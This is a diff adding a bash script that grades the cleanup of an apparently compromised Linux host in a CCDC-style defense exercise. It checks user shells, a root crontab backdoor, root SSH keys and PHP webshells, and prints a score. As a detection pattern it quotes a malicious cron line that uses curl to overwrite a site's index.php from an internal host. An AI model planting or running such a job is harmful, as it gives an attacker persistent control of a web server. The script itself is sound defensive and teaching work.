@@ -1,0 +1,165 @@
+#!/usr/bin/env bash
+
+TOTAL_CHECKS=0
+PASSED_CHECKS=0
+
+
+
+# ANSI COLORS
+GREEN="\e[32m"
+RED="\e[31m"
+CYAN="\e[36m"
+YELLOW="\e[33m"
+RESET="\e[0m"
+
+ok() {
+    echo -e "${GREEN}[OK]${RESET}  $1"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+    PASSED_CHECKS=$((PASSED_CHECKS + 1))
+}
+
+bad() {
+    echo -e "${RED}[X]${RESET}   $1"
+    TOTAL_CHECKS=$((TOTAL_CHECKS + 1))
+}
+
+
+section() {
+    echo -e "\n${CYAN}=== $1 ===${RESET}\n"
+}
+
+subtitle() {
+    echo -e "${YELLOW}-- $1 --${RESET}"
+}
+
+echo -e "\n${CYAN}=== CCDC Cleanup Verification ===${RESET}"
+
+############################################
+# 1) USERS: ccdc / splunk
+############################################
+section "User Accounts"
+
+for u in ccdc splunk; do
+    subtitle "Checking user: $u"
+    if getent passwd "$u" >/dev/null 2>&1; then
+        shell=$(getent passwd "$u" | awk -F: '{print $7}')
+        if echo "$shell" | grep -q "nologin"; then
+            ok "user $u exists with nologin shell ($shell)"
+        else
+            bad "user $u STILL has login shell ($shell)"
+        fi
+    else
+        ok "user $u was removed from the system"
+    fi
+done
+
+############################################
+# 2) CRONTAB: curl backdoor job
+############################################
+section "Crontab Backdoor Check"
+
+BAD_LINE="curl -o /var/www/simple-php-website/index.php http://10.5.8.11/index.php"
+
+subtitle "Checking root crontab"
+crontab_output="$(crontab -l 2>&1)"
+if echo "$crontab_output" | grep -F "$BAD_LINE" >/dev/null 2>&1; then
+    bad "root crontab STILL contains the malicious curl job"
+else
+    ok "root crontab does not contain the malicious curl job"
+fi
+
+subtitle "Checking /var/spool/cron/root"
+if [ -f /var/spool/cron/root ]; then
+    if grep -F "$BAD_LINE" /var/spool/cron/root >/dev/null 2>&1; then
+        bad "/var/spool/cron/root STILL contains the malicious curl job"
+    else
+        ok "/var/spool/cron/root does not contain the malicious curl job"
+    fi
+else
+    ok "/var/spool/cron/root file does not exist (or not used)"
+fi
+
+############################################
+# 3) ROOT SSH authorized_keys
+############################################
+section "Root SSH Key Check"
+
+
+AUTH_FILE="/root/.ssh/authorized_keys"
+
+if [ -f "$AUTH_FILE" ]; then
+    subtitle "authorized_keys exists: $AUTH_FILE"
+
+    if command -v lsattr >/dev/null 2>&1; then
+        # OBTENER SOLO LOS ATRIBUTOS (primera columna)
+        attrs=$(lsattr -d "$AUTH_FILE" 2>/dev/null | awk '{print $1}')
+        if echo "$attrs" | grep -q "i"; then
+            bad "authorized_keys is STILL immutable (chattr +i)"
+        else
+            ok "authorized_keys not immutable (good)"
+        fi
+    fi
+    
+
+    # Check if file has ANY real key
+    if grep -Ev '^\s*#|^\s*$' "$AUTH_FILE" | grep -q .; then
+        bad "root authorized_keys STILL contains active SSH keys"
+    else
+        ok "authorized_keys has no active SSH keys"
+    fi
+else
+    ok "authorized_keys was removed"
+fi
+
+############################################
+# 4) PHP WEBSHELL (shell_exec)
+############################################
+section "PHP Webshell Check"
+
+SEARCH_PATHS="/var/www /var/www/html /var/www/simple-php-website"
+found_webshell=0
+
+for dir in $SEARCH_PATHS; do
+    if [ -d "$dir" ]; then
+        subtitle "Scanning $dir for shell_exec"
+        matches="$(grep -R --line-number 'shell_exec' "$dir" 2>/dev/null || true)"
+        if [ -n "$matches" ]; then
+            found_webshell=1
+            bad "shell_exec STILL present in $dir:"
+            echo -e "${RED}$matches${RESET}"
+        fi
+    fi
+done
+
+if [ "$found_webshell" -eq 0 ]; then
+    ok "no shell_exec found under /var/www*"
+fi
+
+echo -e "\n${CYAN}=== Cleanup verification finished ===${RESET}\n"
+
+############################################
+# FINAL SCORE SUMMARY
+############################################
+echo -e "\n${CYAN}=== FINAL CLEANUP SCORE ===${RESET}\n"
+
+FAILED=$(( TOTAL_CHECKS - PASSED_CHECKS ))
+PERCENT=$(( 100 * PASSED_CHECKS / TOTAL_CHECKS ))
+
+echo -e "${YELLOW}Total Checks:      ${RESET}$TOTAL_CHECKS"
+echo -e "${YELLOW}Passed (OK):       ${RESET}$PASSED_CHECKS"
+echo -e "${YELLOW}Failed (X):        ${RESET}$FAILED"
+echo -e "${YELLOW}Score Percentage:  ${RESET}$PERCENT%"
+
+echo -e "\n${CYAN}=============================${RESET}"
+
+if [ "$PERCENT" -eq 100 ]; then
+    echo -e "${GREEN}System fully cleaned. Excellent work!${RESET}"
+elif [ "$PERCENT" -ge 80 ]; then
+    echo -e "${GREEN}Good cleanup. A few items remain.${RESET}"
+elif [ "$PERCENT" -ge 50 ]; then
+    echo -e "${YELLOW}Partial cleanup. Several issues still present.${RESET}"
+else
+    echo -e "${RED}System still compromised. Needs major cleanup.${RESET}"
+fi
+
+echo -e "${CYAN}=============================${RESET}\n"
